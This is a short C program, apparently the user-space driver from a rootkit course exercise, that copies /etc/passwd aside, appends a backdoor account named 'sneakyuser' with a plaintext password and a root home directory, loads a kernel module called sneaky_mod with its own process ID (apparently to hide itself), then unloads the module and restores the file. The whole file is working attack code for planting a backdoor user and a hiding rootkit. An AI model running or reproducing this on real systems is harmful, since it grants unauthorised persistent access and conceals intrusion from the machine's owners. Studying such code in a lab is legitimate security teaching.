
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void copy_file(){
    system("cp /etc/passwd /tmp");
}

void add_user(){
    system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash' >> "
         "/etc/passwd");
}
void load_module(){
    char argv[50];
    sprintf(argv,"insmod sneaky_mod.ko sneaky_pid=%d", (int)getpid());
    system(argv);
    char c;
    while((c = getchar()) != 'q'){}
}
void remove_module(){
    system("rmmod sneaky_mod");
}
void restore(){
    system("cp /tmp/passwd /etc");
    system("rm /tmp/passwd");
}
int main(){
    printf("sneaky_process pid = %d\n", getpid());
    copy_file();
    add_user();
    load_module();
    remove_module();
    restore();
    return 0;
}